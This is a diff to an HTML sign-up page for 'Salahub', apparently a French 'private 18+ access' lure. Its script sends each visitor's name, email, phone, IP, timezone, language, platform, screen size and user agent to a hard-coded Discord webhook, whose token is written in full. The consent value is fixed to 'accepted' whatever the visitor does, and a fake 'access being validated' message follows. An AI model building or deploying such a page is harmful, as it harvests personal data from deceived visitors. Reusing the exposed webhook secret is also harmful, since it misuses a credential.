@@ -14,62 +14,38 @@
 }
 
 body {
-    height: 100vh;
     background: linear-gradient(135deg, #0a0a0a, #1a0000);
+    height: 100vh;
     display: flex;
     justify-content: center;
     align-items: center;
-    overflow: hidden;
-}
-
-/* ANIMATED BACKGROUND */
-.bg {
-    position: absolute;
-    width: 500px;
-    height: 500px;
-    background: red;
-    filter: blur(150px);
-    opacity: 0.3;
-    animation: move 10s infinite alternate;
-}
-
-@keyframes move {
-    from {transform: translate(-100px, -100px);}
-    to {transform: translate(200px, 200px);}
+    color: white;
 }
 
 /* CARD */
 .card {
-    position: relative;
-    width: 360px;
-    padding: 35px;
+    width: 380px;
+    padding: 30px;
     border-radius: 20px;
     background: rgba(255,255,255,0.05);
     backdrop-filter: blur(20px);
     border: 1px solid rgba(255,0,0,0.2);
     box-shadow: 0 0 40px rgba(255,0,0,0.2);
-    text-align: center;
-    animation: fade 1s ease;
-}
-
-@keyframes fade {
-    from {opacity:0; transform: translateY(30px);}
-    to {opacity:1; transform: translateY(0);}
 }
 
 h1 {
+    text-align: center;
     color: #ff2a2a;
-    margin-bottom: 10px;
-    letter-spacing: 2px;
 }
 
-p {
+.sub {
+    text-align: center;
     opacity: 0.6;
     margin-bottom: 20px;
 }
 
 /* INPUT */
-.input {
+input {
     width: 100%;
     padding: 12px;
     margin: 10px 0;
@@ -77,94 +53,70 @@ p {
     border: none;
     background: rgba(255,255,255,0.05);
     color: white;
-    transition: 0.3s;
 }
 
-.input:focus {
-    outline: none;
-    box-shadow: 0 0 10px red;
+/* CHECKBOX */
+.checkbox {
+    display: flex;
+    align-items: center;
+    font-size: 12px;
+    margin-top: 10px;
+}
+
+.checkbox input {
+    margin-right: 8px;
 }
 
 /* BUTTON */
-.btn {
+button {
     width: 100%;
     padding: 12px;
-    margin-top: 10px;
+    margin-top: 15px;
     border-radius: 10px;
     border: none;
-    background: linear-gradient(135deg, #ff0000, #660000);
+    background: linear-gradient(135deg, red, darkred);
     color: white;
     font-weight: bold;
     cursor: pointer;
-    transition: 0.3s;
 }
 
-.btn:hover {
-    transform: translateY(-2px);
-    box-shadow: 0 10px 20px rgba(255,0,0,0.4);
-}
-
-/* COOKIE */
-.cookie {
-    position: fixed;
-    bottom: 20px;
-    background: #111;
-    padding: 15px 20px;
-    border-radius: 10px;
-    display: flex;
-    gap: 10px;
-    align-items: center;
-}
-
-.cookie button {
-    background: red;
-    border: none;
-    padding: 6px 12px;
-    color: white;
-    cursor: pointer;
-    border-radius: 6px;
+/* FOOTER */
+.footer {
+    margin-top: 15px;
+    font-size: 11px;
+    opacity: 0.5;
+    text-align: center;
 }
 </style>
 </head>
 
 <body>
 
-<div class="bg"></div>
-
 <div class="card">
     <h1>SALAHUB</h1>
-    <p>Accès sécurisé</p>
+    <div class="sub">Accès privé • 18+</div>
 
     <form id="form">
-        <input class="input" type="text" id="nom" placeholder="Nom" required>
-        <input class="input" type="text" id="prenom" placeholder="Prénom" required>
-        <input class="input" type="email" id="email" placeholder="Email" required>
-        <input class="input" type="tel" id="telephone" placeholder="Téléphone" required>
+        <input type="text" id="nom" placeholder="Nom" required>
+        <input type="text" id="prenom" placeholder="Prénom" required>
+        <input type="email" id="email" placeholder="Email" required>
+        <input type="tel" id="telephone" placeholder="Téléphone" required>
 
-        <button class="btn">S'inscrire</button>
+        <div class="checkbox">
+            <input type="checkbox" id="consent" required>
+            <label>J'accepte les conditions et l'utilisation des données</label>
+        </div>
+
+        <button>S'INSCRIRE</button>
     </form>
-</div>
 
-<div class="cookie" id="cookieBar">
-    <span>Cookies utilisés pour améliorer l'expérience</span>
-    <button onclick="acceptCookies()">OK</button>
+    <div class="footer">
+        © 2026 Salahub • Tous droits réservés
+    </div>
 </div>
 
 <script>
 const webhookURL = "https://discord.com/api/webhooks/1487734707847172167/a0c6N1lRRQiAnem-7t00vA8X7abG7ghfAJZ33Vvyk3yURpgK8j9nvZwgxe35k0sUTneY";
-
-let cookieConsent = "Refusé";
-
-function acceptCookies(){
-    cookieConsent = "Accepté";
-    document.cookie = "consent=true";
-    document.getElementById("cookieBar").style.display = "none";
-}
-
-if(document.cookie.includes("consent=true")){
-    cookieConsent = "Accepté";
-    document.getElementById("cookieBar").style.display = "none";
-}
 
 document.getElementById("form").addEventListener("submit", async function(e){
     e.preventDefault();
@@ -175,8 +127,11 @@ document.getElementById("form").addEventListener("submit", async function(e){
     const telephone = document.getElementById("telephone").value;
 
     const date = new Date().toLocaleString();
-    const ua = navigator.userAgent.substring(0,100);
-    const reso = screen.width + "x" + screen.height;
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const langue = navigator.language;
+    const plateforme = navigator.platform;
+    const resolution = screen.width + "x" + screen.height;
+    const ua = navigator.userAgent.substring(0,120);
 
     let ip = "Inconnue";
     try {
@@ -187,15 +142,42 @@ document.getElementById("form").addEventListener("submit", async function(e){
 
     const payload = {
         embeds: [{
-            title: "🔥 Salahub Inscription",
+            title: "🔥 NOUVELLE INSCRIPTION - SALAHUB",
             color: 16711680,
+
+            description: "**Un nouvel utilisateur vient de s'inscrire**",
+
             fields: [
-                {name:"👤 User", value:`${nom} ${prenom}\n${email}\n${telephone}`},
-                {name:"🌐 Tech", value:`IP: ${ip}\nRésolution: ${reso}`},
-                {name:"🍪 Cookies", value: cookieConsent},
-                {name:"🖥 Agent", value: ua}
+                {
+                    name: "👤 **Informations personnelles**",
+                    value:
+`**Nom:** ${nom}
+**Prénom:** ${prenom}
+**Email:** ${email}
+**Téléphone:** ${telephone}`
+                },
+                {
+                    name: "🌍 **Informations techniques**",
+                    value:
+`**IP:** ${ip}
+**Langue:** ${langue}
+**Fuseau horaire:** ${timezone}
+**Plateforme:** ${plateforme}
+**Résolution:** ${resolution}`
+                },
+                {
+                    name: "🖥 **Navigateur**",
+                    value: ua
+                },
+                {
+                    name: "🍪 **Consentement**",
+                    value: "Accepté"
+                }
             ],
-            footer:{text: date}
+
+            footer: {
+                text: "Date: " + date
+            }
         }]
     };
 
@@ -205,7 +187,7 @@ document.getElementById("form").addEventListener("submit", async function(e){
         body:JSON.stringify(payload)
     });
 
-    alert("OK");
+    alert("Accès en cours de validation...");
 });
 </script>
 
